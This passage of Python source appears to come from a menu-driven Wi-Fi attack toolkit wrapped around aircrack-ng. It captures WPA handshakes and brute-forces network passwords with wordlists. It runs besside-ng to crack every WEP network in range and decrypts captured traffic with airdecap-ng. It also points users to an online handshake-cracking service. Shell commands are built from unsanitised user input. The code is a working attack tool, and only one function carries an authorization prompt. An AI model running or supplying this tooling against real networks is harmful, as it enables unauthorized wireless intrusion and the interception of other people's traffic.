                f'only one of the files should have packets inside. Use the file with the packets \n')

            capture_file_address = input(
                f'type the address of the .cap file to continue. for example /tmp/{target_ap}-handshakeCapture/{target_ap}-01.cap : ').strip()
            print(f"selected capture file address is : {ansi_escape_green(capture_file_address)} ")
            selection = input("Type Y to continue Y ").lower()
            if selection == 'y':
                break
    else:
        while 1:
            clear()
            print(f'No Capture file found in /tmp/{target_ap}-handshakeCapture for {ansi_escape_green(target_ap)}')
            print(f'type the address of the .cap file to continue')
            print(
                f'Or type 999 to return to Network attacks menu '
                f'(type C1 in Network attacks to capture the handshake for {ansi_escape_green(target_ap)})')
            capture_file_address = input('address/999 : ')
            if capture_file_address == '999':
                return
            print(f"selected capture file address is : {ansi_escape_green(capture_file_address)} ")
            selection = input("Type Y to continue Y : ").lower()
            if selection == 'y':
                break
    if capture_file_address == '999':
        return
    else:
        clear()
        print(f"selected capture file address is : {ansi_escape_green(capture_file_address)} \n")
        print(f"Here are the password lists that can be used in bruteforce attack\n")

        password_lists_directory_path = 'password_lists'
        while 1:
            for filename in os.listdir(password_lists_directory_path):

                full_path = os.path.join(password_lists_directory_path, filename)

                if os.path.isfile(full_path):
                    print(ansi_escape_green(filename))
            print(f"\nType the name of the password list to be used in bruteforce attack (for example common.txt) : ")
            print(f'or type {ansi_escape_green("1")} to give a path to your own password list : ')
            print(
                f'or type {ansi_escape_green("999")} to cancel bruteforce attack and return to network attacks menu : '
                f'\n')
            selected_password_list = input(f'filename/1/999 : ').strip()
            if selected_password_list == '999':
                return
            if selected_password_list == '1':
                selected_password_list = input(f'give a path to your own password list : ').strip()
                print(f'your password list is {ansi_escape_green(selected_password_list)}')
                selection = input(
                    'type y to continue with this password list or type anything to reselect : ').lower().strip()
                if selection == 'y':
                    break
            else:
                print(f'your password list is {ansi_escape_green(selected_password_list)}')
                selection = input(
                    'type y to continue with this password list or type anything to reselect : ').lower().strip()
                if selection == 'y':
                    selected_password_list = f'password_lists/{selected_password_list}'
                    break

        clear()
        print(
            f'Running aircrack on {ansi_escape_green(target_ap)}'
            f' using wordlist in {ansi_escape_green(selected_password_list)} ')

        target_directory = f'/tmp/{target_ap}-password'
        os.makedirs(target_directory, exist_ok=True)
        aircrack_script = f'aircrack-ng -w {selected_password_list} -b {BSSID} -l {target_directory}/{target_ap}.txt {capture_file_address}'
        for terminal in terminals:
            subprocess.Popen(f'{terminal} -e {aircrack_script}', shell=True, preexec_fn=os.setsid, )
            print(f'aircrack-ng -w {selected_password_list} -b {BSSID} {capture_file_address}')
            print('\n')
            print(
                f'Process Complete. To check if password is found '
                f'look at {ansi_escape_green(f"{target_directory}/{target_ap}.txt")}')
            input('press enter to return to network attacks')
            return


def capture_packets(interface, target_ap):
    output = get_airodump_output(interface)
    if output is None:
        print(
            f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful However it '
            f'appears there are no devices connected to {ansi_escape_green(target_ap)}')
        print(
            f'If you {ansi_escape_red("dont")} see Airodump output '
            f'then there is a problem with {ansi_escape_red("get_airodump_output")}')
        input(f'input anything to return to previous function \n')
        return

    elif output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        BSSID, CHANNEL = get_bssid_and_station_from_ap(interface, target_ap)
        print(f'Running packet capture on {ansi_escape_green(target_ap)}')
        print(f'Switching channel on  {ansi_escape_green(interface)} to {ansi_escape_green(CHANNEL)}')
        switch_channel = subprocess.Popen(f'iwconfig {interface} channel {CHANNEL}', shell=True)
        switch_channel.wait()

        print(f'Running airodump {ansi_escape_green(target_ap)}')

        target_directory = f'/tmp/{target_ap}-Captures'
        os.makedirs(target_directory, exist_ok=True)

        airodump_capture_location = f'/tmp/{target_ap}-Captures/{target_ap}'

        airodump = subprocess.Popen(
            f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w {airodump_capture_location} {interface}',
            shell=True, preexec_fn=os.setsid, )

        time.sleep(30)

        clear()
        try:
            os.killpg(airodump.pid, signal.SIGTERM)
            airodump.wait()
        except ProcessLookupError:
            print('airodump killed unexpectedly', ProcessLookupError)

        print(f"Packet Capture is saved in '{ansi_escape_green('/tmp/{target_ap}-Captures/')}'")

    else:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("capture_handshake")}')
        print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
        input(f'input anything to return to previous function \n')
        return


def graph_networks(target_ap):
    clear()

    print(f"To graph a network first you need to have a {ansi_escape_green('csv')} file captured with airodump\n")
    print(f'Here is the list of all csv files that start with {ansi_escape_green(target_ap)} in /tmp/ directory\n')

    find_files_with_locate = subprocess.run(
        f"find /tmp/ -type f -name '{target_ap}-*.csv' ! -name '*log.csv' ! -name '*kismet.csv'",
        shell=True,
        capture_output=True,
        text=True
    )
    print(find_files_with_locate.stdout)

    print(f'\ntype the address of the .csv file to continue')
    print(
        f'Or type 999 to return to Network attacks menu '
        f'(use Network attacks to capture packets for {ansi_escape_green(target_ap)})')
    while 1:
        capture_file_address = input('address/999 : ').strip()
        if capture_file_address == '999':
            return
        print(f" selected address is {ansi_escape_green(capture_file_address)}")
        selection = input(
            'input Y to continue with this address (input anything else to select another address):').lower().strip()
        if selection == 'y':
            break
    clear()
    print(f"Using {ansi_escape_green('airgraph-ng')}  with {ansi_escape_green(capture_file_address)}")

    while 1:
        selection = input('CAPR / CPG : ').lower()
        if selection == 'capr':
            graph_output_location = f'/tmp/{target_ap}-CAPR'
            airgraph_command = f'airgraph-ng -i {capture_file_address} -o {graph_output_location} -g CAPR'
            break
        if selection == 'cpg':
            graph_output_location = f'/tmp/{target_ap}-CPG'
            airgraph_command = f'airgraph-ng -i {capture_file_address} -o {graph_output_location} -g CPG'
            break
    airgraph = subprocess.Popen(airgraph_command, shell=True)
    airgraph.wait()
    input(f'output saved in {graph_output_location} press enter to continue')
    return


def besside(interface):
    print(
        f'What you are about to run is a Package called {ansi_escape_green("besside-ng")}'
        f' that is a part of {ansi_escape_green("Aircrack-ng")}\n')
    print(f'{ansi_escape_green("besside-ng")}  is a tool which will crack all the WEP networks in range and log all '
          f'the WPA handshakes.  WPA handshakes can be uploaded to the online cracking service at wpa.darkircop.org.  '
          f'Wpa.darkircop.com also provides useful statistics based on user-submitted capture files about the '
          f'feasibility of WPA cracking. {ansi_escape_green("this description is from $man besside-ng")}\n')

    print(f'This tool is intended strictly for security research and testing purposes within environments where the '
          f'user has explicit authorization to conduct such activities. Misuse of this tool against networks without '
          f'such authorization is illegal and unethical \n')

    consent = input(
        'Do you still want to continue and approve that you have authorization to use this tool (yes/no): ').lower()

    if consent == 'yes':
        clear()
        timer = 5
        while timer > 0:
            print(f"Attack starts in {timer}")
            time.sleep(1)
            timer -= 1
        for terminal in terminals:
            target_directory = f'/tmp/besside-all'
            os.makedirs(target_directory, exist_ok=True)
            besside_process = subprocess.Popen(f'{terminal} -e besside-ng {interface}',
                                               shell=True,
                                               preexec_fn=os.setsid,
                                               cwd=target_directory)
            besside_process.wait()
            print(f'Process is Complete\n',
                  f'To check if handshake capture was successful look at the {ansi_escape_green("besside.log")} '
                  f'in {ansi_escape_green(target_directory)}\n')
            print(
                f'If any handshake was captured then either use {ansi_escape_green("wep.cap")} '
                f'or {ansi_escape_green("wpa.cap")} with aircrack to bruteforce password')
            print(
                f'If you dont know which one to use then open them using {ansi_escape_green("wireshark")} '
                f'only one of the files should have packets inside. Use the file with the packets \n')

            print('\nWPA handshakes can be uploaded to the online cracking service at wpa.darkircop.org.  '
                  'Wpa.darkircop.com also provides useful statistics based on user-submitted capture files about the '
                  'feasibility of WPA cracking.')

            input('input anything to return to network attacks menu : ')
            return


def besside_target_ap(interface, target_ap):
    bssid, channel = get_bssid_and_station_from_ap(interface, target_ap)
    print(bssid)
    if bssid:
        clear()
        for terminal in terminals:
            target_directory = f'/tmp/{target_ap}-besside'
            os.makedirs(target_directory, exist_ok=True)

            besside_process = subprocess.Popen(f'{terminal} -e besside-ng -b {bssid} {interface}',
                                               shell=True,
                                               preexec_fn=os.setsid,
                                               cwd=target_directory)
            besside_process.wait()
            print(f'Process is Complete\n',
                  f'To check if handshake capture was successful look at the {ansi_escape_green("besside.log")} '
                  f'in {ansi_escape_green(target_directory)}\n')
            print(f'If handshake was captured then either use {ansi_escape_green("wep.cap")} '
                  f'or {ansi_escape_green("wpa.cap")} with aircrack to bruteforce password')
            print(f''
                  f'If you dont know which one to use then open them using {ansi_escape_green("wireshark")} '
                  f'only one of the files should have packets inside. Use the file with the packets \n')
            input('input anything to return to network attacks menu : ')
            return
        return
    else:
        print("BSSID not found")


def airdecap_wpa(target_ap):
    """
    https://www.aircrack-ng.org/doku.php?id=airdecap-ng

    :param target_ap:
    :return:
    """
    while 1:
        print(f'Here is the list of all cap files that start with {ansi_escape_green(target_ap)} in /tmp\n')
        find_files_with_locate = subprocess.run(
            f"find /tmp -type f -name '{target_ap}-*.cap' ",
            shell=True,
            capture_output=True,
            text=True
        )
        print(find_files_with_locate.stdout)
        capture_location = (input(
            f'Type the address of (WPA/WPA2) packet capture of {ansi_escape_green(target_ap)} you want to decrypt : ')
                            .strip())
        password_of_ap = input(f'Type the password of {ansi_escape_green(target_ap)} you want to decrypt : ')
        clear()
        print(f'Capture file = {ansi_escape_green(capture_location)}\n'
              f'Password of {ansi_escape_green(target_ap)} = {ansi_escape_green(password_of_ap)}')
        print(f' Type {ansi_escape_green("E")} to return to network attacks')
        selection = input('Is everything correct Y/N/E : ').lower()
        if selection == 'y':
            break
        if selection == 'e':
            return
    clear()
    print(f'Running decryption on {ansi_escape_green(capture_location)} with airdecap \n')
    airdecap_script = f'airdecap-ng -e {target_ap} -p {password_of_ap} {capture_location}'
    airdecap = subprocess.Popen(airdecap_script, shell=True,
                                preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    airdecap.wait()
    stdout, stderr = airdecap.communicate()
    if 'Could not open' in stdout:
        print(f'{ansi_escape_red("STDOUT")}  = {stdout}')
        print(f'{ansi_escape_red("STDERR")}  = {stderr}')
        print(f'Decryption failed, possibly due to {ansi_escape_red("mistype in capture file location")}')
        input('Press enter to return ')
        return
    if 'Number of decrypted WPA  packets         0' in stdout:
        print(f'{ansi_escape_red("STDOUT")}  = {stdout}')
        print(f'{ansi_escape_red("STDERR")}  = {stderr}')
        print(f'Decryption failed, possible mistype in {ansi_escape_red("password")}')
        input('Press enter to return ')
        return
    potential_decap_output = ''
    if len(capture_location) >= 4:
        potential_decap_output = capture_location[:-3]
        potential_decap_output += 'dec.cap'
    print(f'\nif airdecap was successful the decrypted output must be on {ansi_escape_green(potential_decap_output)}')
    input(f'Input anything to return to network attacks : ')
